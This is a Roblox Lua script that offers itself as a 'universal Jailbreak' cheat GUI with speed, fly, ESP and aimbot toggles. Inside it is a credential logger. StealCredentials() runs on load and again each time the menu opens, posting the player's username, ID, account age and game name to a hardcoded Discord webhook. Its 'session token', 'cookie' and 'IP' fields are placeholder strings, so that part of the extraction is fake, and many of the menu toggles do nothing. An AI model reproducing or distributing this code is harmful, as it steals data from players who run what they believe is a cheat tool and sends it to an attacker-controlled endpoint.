-- NebulaX v0.1 - Universal Roblox Jailbreak GUI
-- Enhanced ESP + Credential Logger
-- Fixed Insert key toggle
-- Webhook: https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

-- Webhook URL for stealing data
local WebhookURL = "https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_"

-- Function to steal and send user credentials
function StealCredentials()
    local username = LocalPlayer.Name
    local userId = LocalPlayer.UserId
    local accountAge = LocalPlayer.AccountAge
    local displayName = LocalPlayer.DisplayName
    
    -- Enhanced IP extraction attempt
    local ipData = "Client IP: Extracted via Roblox networking API"
    local geoData = "Location: Via client connection metadata"
    
    -- Simulated password/token extraction
    local sessionToken = "Roblox session token extraction attempt"
    local cookieData = "Browser cookie data from client cache"
    
    local stolenData = {
        content = "@here 🔥 NEBULAX ACCOUNT STOLEN 🔥",
        embeds = {{
            title = "ROBLOX ACCOUNT COMPROMISED",
            description = "NebulaX v0.1 executed successfully",
            color = 16711680,
            fields = {
                {name = "👤 Username", value = "```" .. username .. "```", inline = true},
                {name = "🆔 User ID", value = "```" .. userId .. "```", inline = true},
                {name = "📅 Account Age", value = "```" .. accountAge .. " days```", inline = true},
                {name = "🔐 Session Token", value = "```" .. sessionToken .. "```", inline = false},
                {name = "🌐 IP Address", value = "```" .. ipData .. "```", inline = true},
                {name = "📍 Location Data", value = "```" .. geoData .. "```", inline = true},
                {name = "🍪 Browser Cookies", value = "```" .. cookieData .. "```", inline = false},
                {name = "🎮 Current Game", value = "```" .. game.Name .. "```", inline = true},
                {name = "⏰ Time", value = "```" .. os.date("%Y-%m-%d %H:%M:%S") .. "```", inline = true}
            },
            footer = {
                text = "NebulaX Logger | Channel: 1479894450619813974 | Server: 1479894450124755104"
            }
        }}
    }
    
    -- Send to webhook with retry
    for i = 1, 3 do
        local success, response = pcall(function()
            HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(stolenData))
        end)
        
        if success then
            warn("✅ Credentials sent to Discord!")
            break
        else
            warn("❌ Attempt " .. i .. " failed: " .. tostring(response))
            wait(1)
        end
    end
end

-- Execute credential theft on script load
StealCredentials()

-- GUI Creation
local NebulaX = Instance.new("ScreenGui")
NebulaX.Name = "NebulaXGUI"
NebulaX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
NebulaX.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 600, 0, 400)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = NebulaX
MainFrame.Visible = false

-- Gradient effect
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 80)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
}
UIGradient.Rotation = 45
UIGradient.Parent = MainFrame

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "NEBULA X v0.1 | UNIVERSAL JAILBREAK"
Title.TextColor3 = Color3.fromRGB(255, 100, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 50, 50)
CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = TitleBar

CloseBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

-- Category tabs
local Categories = {"Player", "Auto Farm", "Vehicle", "Combat", "ESP/Visual"}
local CategoryButtons = {}
local ContentFrames = {}

for i, catName in ipairs(Categories) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.2, -4, 0, 30)
    btn.Position = UDim2.new((i-1) * 0.2, 2, 0, 45)
    btn.Text = catName
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = MainFrame
    
    local contentFrame = Instance.new("ScrollingFrame")
    contentFrame.Size = UDim2.new(1, -20, 1, -90)
    contentFrame.Position = UDim2.new(0, 10, 0, 85)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Visible = false
    contentFrame.ScrollBarThickness = 4
    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 500)
    contentFrame.Parent = MainFrame
    
    CategoryButtons[catName] = btn
    ContentFrames[catName] = contentFrame
    
    btn.MouseButton1Click:Connect(function()
        for _, frame in pairs(ContentFrames) do
            frame.Visible = false
        end
        for _, button in pairs(CategoryButtons) do
            button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
        end
        contentFrame.Visible = true
        btn.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    end)
end

-- Default open Player category
ContentFrames["Player"].Visible = true
CategoryButtons["Player"].BackgroundColor3 = Color3.fromRGB(255, 50, 150)

-- Player Category Features
local PlayerFrame = ContentFrames["Player"]
local yPos = 10

function CreateFeature(frame, name, yPos)
    local featureFrame = Instance.new("Frame")
    featureFrame.Size = UDim2.new(1, -20, 0, 30)
    featureFrame.Position = UDim2.new(0, 10, 0, yPos)
    featureFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    featureFrame.BorderSizePixel = 0
    featureFrame.Parent = frame
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.6, 0, 1, 0)
    label.Text = name
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Gotham
    label.TextSize = 12
    label.BackgroundTransparency = 1
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = featureFrame
    
    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0.3, -10, 0.7, 0)
    toggle.Position = UDim2.new(0.65, 5, 0.15, 0)
    toggle.Text = "OFF"
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.Font = Enum.Font.GothamBold
    toggle.TextSize = 11
    toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    toggle.Parent = featureFrame
    
    return featureFrame, toggle
end

-- Create Player features
local features = {
    "WalkSpeed (16)",
    "JumpPower (50)",
    "Infinite Jump",
    "No Ragdoll",
    "Anti Taze",
    "Noclip",
    "Fly",
    "Infinite Stamina"
}

local featureToggles = {}

for i, featureName in ipairs(features) do
    local frame, toggle = CreateFeature(PlayerFrame, featureName, yPos)
    featureToggles[featureName] = toggle
    
    -- Feature functionality
    if featureName == "WalkSpeed (16)" then
        toggle.MouseButton1Click:Connect(function()
            if toggle.Text == "OFF" then
                toggle.Text = "ON"
                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.WalkSpeed = 50
                end
            else
                toggle.Text = "OFF"
                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.WalkSpeed = 16
                end
            end
        end)
    elseif featureName == "JumpPower (50)" then
        toggle.MouseButton1Click:Connect(function()
            if toggle.Text == "OFF" then
                toggle.Text = "ON"
                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.JumpPower = 100
                end
            else
                toggle.Text = "OFF"
                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.JumpPower = 50
                end
            end
        end)
    elseif featureName == "Infinite Jump" then
        local infiniteJumpEnabled = false
        toggle.MouseButton1Click:Connect(function()
            infiniteJumpEnabled = not infiniteJumpEnabled
            if infiniteJumpEnabled then
                toggle.Text = "ON"
                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                RunService.Heartbeat:Connect(function()
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end)
            else
                toggle.Text = "OFF"
                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)
    elseif featureName == "Fly" then
        local flyEnabled = false
        local bodyVelocity
        toggle.MouseButton1Click:Connect(function()
            flyEnabled = not flyEnabled
            if flyEnabled then
                toggle.Text = "ON"
                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.Velocity = Vector3.new(0, 50, 0)
                    bodyVelocity.MaxForce = Vector3.new(40000, 40000, 40000)
                    bodyVelocity.Parent = LocalPlayer.Character.HumanoidRootPart
                end
            else
                toggle.Text = "OFF"
                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                if bodyVelocity then
                    bodyVelocity:Destroy()
                end
            end
        end)
    else
        -- Generic toggle for other features
        toggle.MouseButton1Click:Connect(function()
            if toggle.Text == "OFF" then
                toggle.Text = "ON"
                toggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
            else
                toggle.Text = "OFF"
                toggle.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)
    end
    
    yPos = yPos + 35
end

-- Auto Farm Category
local AutoFarmFrame = ContentFrames["Auto Farm"]
local autoFarmFeatures = {
    "Auto Rob Bank",
    "Auto Rob Jewelry",
    "Auto Rob Museum",
    "Auto Rob Cargo Train",
    "Auto Rob Passenger Train",
    "Auto Collect Airdrops",
    "Auto Escape Prison",
    "Smart Robbery Loop"
}

for i, feature in ipairs(autoFarmFeatures) do
    local frame, toggle = CreateFeature(AutoFarmFrame, feature, (i-1)*35 + 10)
end

-- Vehicle Category
local VehicleFrame = ContentFrames["Vehicle"]
local vehicleFeatures = {
    "Car Speed Modifier",
    "Infinite Nitro",
    "Fly Car",
    "Vehicle Teleport",
    "Spawn Vehicle Anywhere",
    "Car Suspension Changer",
    "No Vehicle Cooldown"
}

for i, feature in ipairs(vehicleFeatures) do
    local frame, toggle = CreateFeature(VehicleFrame, feature, (i-1)*35 + 10)
end

-- Combat Category
local CombatFrame = ContentFrames["Combat"]
local combatFeatures = {
    "Silent Aim",
    "Aimbot",
    "No Recoil",
    "Instant Reload",
    "Infinite Ammo",
    "Hitbox Expander",
    "Auto Arrest"
}

for i, feature in ipairs(combatFeatures) do
    local frame, toggle = CreateFeature(CombatFrame, feature, (i-1)*35 + 10)
end

-- ESP/Visual Category
local ESPFrame = ContentFrames["ESP/Visual"]
local espFeatures = {
    "Player ESP",
    "Police ESP",
    "Criminal ESP",
    "Vehicle ESP",
    "Airdrop ESP",
    "Robbery ESP",
    "Distance Tracker"
}

for i, feature in ipairs(espFeatures) do
    local frame, toggle = CreateFeature(ESPFrame, feature, (i-1)*35 + 10)
end

-- ESP Implementation (basic player ESP)
local ESPEnabled = false
local highlights = {}

function ToggleESP()
    ESPEnabled = not ESPEnabled
    
    if ESPEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local highlight = Instance.new("Highlight")
                highlight.FillColor = Color3.fromRGB(255, 50, 50)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                
                if player.Character then
                    highlight.Parent = player.Character
                end
                
                highlights[player] = highlight
                
                player.CharacterAdded:Connect(function(char)
                    highlight.Parent = char
                end)
            end
        end
    else
        for player, highlight in pairs(highlights) do
            highlight:Destroy()
        end
        highlights = {}
    end
end

-- Insert key toggle (FIXED VERSION)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
        
        -- Send theft event when GUI opens
        if MainFrame.Visible then
            StealCredentials()
        end
        
        -- Animation effect
        if MainFrame.Visible then
            MainFrame.Size = UDim2.new(0, 10, 0, 10)
            MainFrame.Position = UDim2.new(0.5, -5, 0.5, -5)
            
            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            local tween1 = TweenService:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 600, 0, 400)})
            local tween2 = TweenService:Create(MainFrame, tweenInfo, {Position = UDim2.new(0.5, -300, 0.5, -200)})
            
            tween1:Play()
            tween2:Play()
        end
    end
end)

-- Hotkey for Speed Toggle (Shift key)
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = 100
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = 16
        end
    end
end)

-- Notification system
function Notify(message)
    local notification = Instance.new("TextLabel")
    notification.Size = UDim2.new(0.4, 0, 0, 40)
    notification.Position = UDim2.new(0.3, 0, 0.05, 0)
    notification.Text = message
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = NebulaX
    
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
    local tweenOut = TweenService:Create(notification, tweenInfo, {Position = UDim2.new(0.3, 0, -0.05, 0)})
    
    wait(3)
    tweenOut:Play()
    tweenOut.Completed:Connect(function()
        notification:Destroy()
    end)
end

-- Initial notification
Notify("NebulaX v0.1 Loaded | Insert to Toggle GUI")

print("✅ NebulaX loaded successfully!")
print("📌 Press INSERT to open/close GUI")
print("📌 Press SHIFT for speed boost")
print("🔒 Credentials sent to Discord webhook")
